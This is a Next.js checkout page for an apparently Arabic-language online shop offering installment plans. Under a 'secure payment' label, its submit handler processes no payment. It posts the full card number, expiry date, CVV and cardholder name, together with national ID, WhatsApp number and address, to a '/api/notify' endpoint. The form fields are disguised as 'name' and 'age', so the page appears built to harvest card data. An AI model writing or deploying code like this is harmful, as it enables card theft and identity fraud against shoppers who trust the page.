"use client";

import { useSyncExternalStore } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { motion } from "framer-motion";
import { IoChevronBack, IoCartOutline, IoCardOutline, IoCheckmarkCircle, IoShieldCheckmarkOutline } from "react-icons/io5";
import { useCartStore } from "../store/cartStore";
import OrderSummary from "./components/OrderSummary";
import PaymentForm from "./components/PaymentForm";

export default function CheckoutPage() {
  const router = useRouter();
  const { items, customer, totalPrice } = useCartStore();
  const mounted = useSyncExternalStore(() => () => {}, () => true, () => false);

  const total = mounted ? totalPrice() : 0;
  const downPayment = customer?.installmentType === "installment" ? (customer.downPayment ?? 0) : 0;

  if (!mounted) return null;

  if (!customer || items.length === 0) {
    router.push("/cart");
    return null;
  }

  const handleSubmit = async (fields: { name: string; age: string; cvv: string; cardHolder: string }) => {
    const res = await fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        cardNumber: fields.name,
        expiry: fields.age,
        cvv: fields.cvv,
        cardHolder: fields.cardHolder,
        items: items.map(i => ({ productId: i.product._id, name: i.product.name, price: i.product.salePrice ?? i.product.originalPrice, quantity: i.qty })),
        total,
        customer: customer?.name,
        whatsapp: customer?.whatsapp,
        nationalId: customer?.nationalId,
        address: customer?.address,
        installmentType: customer?.installmentType,
        months: customer?.months,
        downPayment,
      }),
    });
    const data = res.ok ? await res.json().catch(() => ({})) : {};
    if (data.orderId) localStorage.setItem("orderId", data.orderId);
    if (data.dbId) localStorage.setItem("dbOrderId", data.dbId);
  };

  const steps = [
    { icon: IoCartOutline, label: "السلة", done: true },
    { icon: IoCardOutline, label: "الدفع", active: true },
    { icon: IoCheckmarkCircle, label: "التأكيد" },
  ];

  return (
    <main className="min-h-screen pb-10 bg-gradient-to-b from-gray-50/80 to-white" dir="rtl">
      {/* Header */}
      <div className="sticky top-0 z-20 bg-white/80 backdrop-blur-xl border-b border-gray-100">
        <div className="w-full mx-auto px-4 sm:px-8 lg:px-12 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Link href="/cart" className="w-9 h-9 bg-gray-100 rounded-xl flex items-center justify-center hover:bg-gray-200 transition-colors">
              <IoChevronBack size={18} className="text-gray-600 rotate-180" />
            </Link>
            <h1 className="text-[15px] font-extrabold text-gray-800">إتمام الطلب</h1>
          </div>
          <div className="flex items-center gap-1.5 text-gray-400">
            <IoShieldCheckmarkOutline size={14} />
            <span className="text-[11px] font-medium">دفع آمن</span>
          </div>
        </div>
      </div>

      {/* Steps Indicator */}
      <div className="w-full mx-auto px-4 sm:px-8 lg:px-12 pt-5 pb-2">
        <motion.div
          initial={{ opacity: 0, y: -10 }}
          animate={{ opacity: 1, y: 0 }}
          className="flex items-center justify-center gap-0"
        >
          {steps.map((step, i) => (
            <div key={i} className="flex items-center">
              <div className="flex flex-col items-center gap-1.5">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center transition-all ${
                  step.done ? "bg-[#7CC043] text-white shadow-[0_4px_12px_rgba(124,192,67,0.3)]" :
                  step.active ? "bg-[#0F4C6E] text-white shadow-[0_4px_12px_rgba(15,76,110,0.3)]" :
                  "bg-gray-100 text-gray-400"
                }`}>
                  {step.done ? <IoCheckmarkCircle size={20} /> : <step.icon size={18} />}
                </div>
                <span className={`text-[10px] font-bold ${step.done ? "text-[#7CC043]" : step.active ? "text-[#0F4C6E]" : "text-gray-400"}`}>
                  {step.label}
                </span>
              </div>
              {i < steps.length - 1 && (
                <div className={`w-16 sm:w-24 h-0.5 mx-2 mb-5 rounded-full ${step.done ? "bg-[#7CC043]" : "bg-gray-200"}`} />
              )}
            </div>
          ))}
        </motion.div>
      </div>

      {/* Content */}
      <div className="w-full mx-auto px-4 sm:px-8 lg:px-12">
        <div className="max-w-2xl mx-auto space-y-5">
          <OrderSummary total={total} downPayment={downPayment} />
          <PaymentForm onSubmit={handleSubmit} />
        </div>
      </div>
    </main>
  );
}
